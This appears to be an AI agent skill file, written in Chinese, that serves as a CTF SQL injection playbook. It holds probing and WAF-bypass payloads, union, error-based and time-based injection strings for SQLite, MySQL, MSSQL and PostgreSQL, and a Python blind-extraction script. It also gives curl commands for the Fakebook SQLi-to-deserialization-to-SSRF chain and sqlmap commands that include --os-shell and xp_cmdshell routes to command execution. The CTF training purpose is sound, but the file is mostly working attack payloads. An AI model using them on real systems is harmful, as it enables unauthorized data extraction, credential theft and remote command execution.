---
name: ctf-web-sqli
description: CTF SQL 注入 攻击 playbook。识别/触发指纹：SQL注入/SQL injection/参数加单引号报错/union select/or 1=1/盲注/boolean blind/time-based/sqlmap/SQLite/MySQL/MSSQL/PostgreSQL/WAF绕过/注入点/order by/堆叠注入/information_schema/sqlite_master。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"——注入点定位、列数/回显判定、WAF 绕过、union/报错/盲注/文件读、各 DBMS 方言差异。
---

# CTF SQL 注入 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先 union/报错/盲注/文件读等本地回显路径；OOB（DNS exfil / UNC 路径回连 attacker.com）概念可提，但 CTF 靶机常不出网，优先本地回显。

## 识别特征（什么时候调我）
- GET/POST/COOKIE/Header 参数加 `'` 或 `"` 触发 SQL 报错回显（如 `unrecognized token`、`syntax error near`、`MySQLSyntaxErrorException`）。
- `and 1=1` 与 `and 1=2` 响应内容/长度差异 → 布尔盲注指纹。
- `id=1` 正常，`id=1'` 报错或空白；`order by N` 在某 N 突然报错 → union 注入回显型。
- `sleep(3)` / `sqlite3_sleep` / `WAITFOR DELAY` 触发可观测延迟 → 时间盲注。
- 提交 `union select` 返回 "no hack"/"waf"/403 → WAF 过滤，需绕过。
- 报错页带 DB 版本/路径/查询片段 → 报错注入可利用。
- 题目提示后端为 SQLite（轻量、文件型 `.db`）/MySQL/MSSQL/PostgreSQL 之一。

## 核心攻击手法

### 1. 注入点探测与列数/回显判定
```text
'  "  ')  "))  ' -- -   ' or '1'='1
1 order by 1   # 递增到报错，临界值 = 列数
0 union select 1,2,3,4   # 回显位上出现数字的那几列可写 payload
```
HTTP 头注入同样适用（CTF 常把注入点藏在 `User-Agent` / `Referer` / `X-Forwarded-For`，注册/留言/统计接口回写库）：
```bash
curl -s "$URL/view.php?no=0" -A "Mozilla';-- -"
# 留言板/XFF 布尔差异判断
curl -s "$URL/guestbook" -H "X-Forwarded-For: 1' or 1=1-- -"
```

### 2. WAF 绕过（最常见：内联注释打散关键字）
```sql
-- 正则 /union\Wselect/ 被拦：用注释当单词分隔符
0 union/**/select 1,2,3,4
-- 大小写/嵌套/等价函数
UnIoN SeLecT 0x6161   0x/**/union/**/0x
-- 过滤空格：注释、括号、Tab/换行(%09 %0a %0b %0c)替代
union%0aselect  1,2,3,4
-- 过滤逗号：join / case when / substring(word from 1 for 1)
0 union select * from (select 1)a join (select 2)b join (select 3)c
```

### 3. 各 DBMS 方言速查（拿库/表/列）
**SQLite3**（文件型、常配 PHP，无 information_schema，查 `sqlite_master`）：
```sql
0 union/**/select 1,(select sql from sqlite_master limit 1),3,4   -- 建表语句=列结构
0 union/**/select 1,group_concat(name),3,4 from sqlite_master      -- 所有表名
0 union/**/select 1,(select password from users limit 1),3,4
```
**MySQL**：
```sql
0 union select 1,version(),database(),4
0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x7573657273
```
**MSSQL**（堆叠、`xp_cmdshell` 可达 RCE）：`0; select @@version -- `、`0; exec xp_cmdshell 'whoami' --`
**PostgreSQL**：`0 union select 1,current_user,version(),4`；可 `copy ... to program 'cmd'` 达 RCE。

### 4. 报错注入（有报错回显、无 union 回显位时）
```sql
-- MySQL
1' and extractvalue(0,concat(0x7e,(select version())))-- -
1' and updatexml(1,concat(0x7e,(select flag from flags limit 1)),1)-- -
-- MySQL floor 经典
1' and (select 1 from (select count(*),concat((select flag from flags limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```

### 5. 布尔盲注骨架（确认 vs 推测：先用已知值校验脚本，避免假阳性）
```python
import requests
URL="http://TARGET/view.php?no=1"
def q(cond):  # 返回 True/False：用题目确定存在的标记（如用户名/长度差）做 oracle
    r=requests.get(URL, params={"no": f"1 and {cond}-- -"})
    return "admin" in r.text   # 用真实页面标记，勿用占位符
# 二分取长度与字符（用自定义数据本地校验后再打靶）
L=0
while not q(f"(select length(flag) from flags)={L}"): L+=1
flag=""
for i in range(1,L+1):
    lo,hi=32,127
    while lo<hi:
        mid=(lo+hi)//2
        if q(f"ascii(substr((select flag from flags),{i},1))>{mid}"): lo=mid+1
        else: hi=mid
    flag+=chr(lo); print(flag)
```

### 6. 时间盲注（无任何回显差异时）
```sql
1' and if((select ascii(substr(flag,1,1)) from flags)=102,sleep(3),0)-- -  -- MySQL
1' and case when (1=1) then sqlite3_sleep(3000) else 0 end-- -            -- SQLite（3.42+）
```

## CTF 实战结晶
**Fakebook（网鼎杯2018 / TopSecCTF，已确认）**——SQLi + 反序列化 + SSRF 链拿 flag：
- **注入点（已确认）**：`view.php?no=` GET 参数，`?no=1'` 回显 `unrecognized token: "'"`。后端 **SQLite3**（库文件 `/tmp/fakebook.db`），源码 `getUserByNo()` 直接字符串拼接 `$no`。
- **WAF 绕过（已确认）**：`db.php` 的 `anti_sqli()` 正则 `/union\Wselect|0x|hex/i` → `union select` 被拦返回 "no hack"；用 **`union/**/select` 内联注释**（注释当 `\W` 单词边界）绕过。
- **列数/回显（已确认）**：`order by 5` → "should be between 1 and 4"，4 列；第 4 列 `data` 被回显。
- **库结构提取**：`0 union/**/select 1,(select sql from sqlite_master limit 1),3,4` → `CREATE TABLE users(id,username,password,data)`。
- **利用链**：第 4 列塞入恶意序列化 `UserInfo` 对象（`blog=file:///var/www/html/flag.php`），`view.php` 第31行 `unserialize($res['data'])` 触发 `getBlogContents()` → curl `file://` SSRF（`get()` 未设 `CURLOPT_PROTOCOLS`）→ 读到 `flag.php` base64 进 iframe，解码得 `flag{cc6967ce-...}`。
- **可跑 union 注入骨架**：
```bash
# 列数 / 回显位
curl -s "http://T/view.php?no=0%20union/**/select%201,2,3,4"
# 库结构
curl -s "http://T/view.php?no=0%20union/**/select%201,(select%20sql%20from%20sqlite_master%20limit%201),3,4"
# 第4列注入序列化对象（blog=file://...）触发 SSRF 文件读
curl -s "http://T/view.php?no=0%20union/**/select%201,2,3,'O:8:\"UserInfo\":4:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:1;s:4:\"blog\";s:25:\"file:///var/www/html/flag.php\";}'"
```
- **盲注脚本骨架**（任意注入点通用，含 Header 注入点；先本地用自定义数据校验 oracle，别用默认值假阳性）：
```python
import requests,urllib.parse
TARGET="http://T/view.php?no=0%20union/**/select%201,2,3,(select%20password%20from%20users%20limit%201)"
# header 盲注点同理换注入位置：requests.get(U, headers={"User-Agent": f"' or ({cond})-- -"})
def leak(expr):  # expr 为可放入第N列的子查询
    import requests,base64,re
    r=requests.get("http://T/view.php", params={"no":f"0 union/**/select 1,2,3,{expr}"})
    return r.text
```
完整 exploit 见 `/home/threed/ctf/web/fakebook_exploit.py`（自动构造序列化对象→注入→SSRF→base64 解码）。

## 工具命令
```bash
# sqlmap 速通（有回显/注入点明确时优先手工定位再交给 sqlmap）
sqlmap -u "http://T/view.php?no=1" -p no --random-agent --batch --dbs
sqlmap -u "http://T/view.php?no=1" -p no --random-agent --technique=BEUSTQ --dump -T users
sqlmap -r req.txt -p no --os-shell          # 走 Burp 保存的请求，堆叠/写文件
sqlmap -u "http://T/view.php?no=1" --tamper=space2comment,between    # WAF 绕过 tamper 脚本
# 手工 union 探测
for n in 1 2 3 4 5; do curl -s "http://T/view.php?no=0%20order%20by%20$n" | head; done
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/sqli-sql-injection/SKILL.md
- hack-skills-main/skills/sqli-sql-injection/SQLMAP_ADVANCED.md
- hack-skills-main/skills/sqli-sql-injection/SCENARIOS.md

## 关联 leaf
- **Fakebook 链**：`ctf-web-sqli`（本 leaf，定位注入点+WAF绕过）→ `ctf-web-deser`（unserialize 控制对象属性）→ `ctf-web-ssrf`（curl `file://` 读 flag.php）。
- `ctf-web-ssrf`：gopher/file/协议无限制；SQLi 拿到的数据常驱动 SSRF 读内网/本地文件。
- `ctf-web-deser`：PHP/Java 反序列化，data 列内容受 SQLi 控制（如本链序列化对象写入第4列）。
- `ctf-web-lfi`：`file://`/路径穿越读源码常与 SQLi 报错互补定位真实库结构。
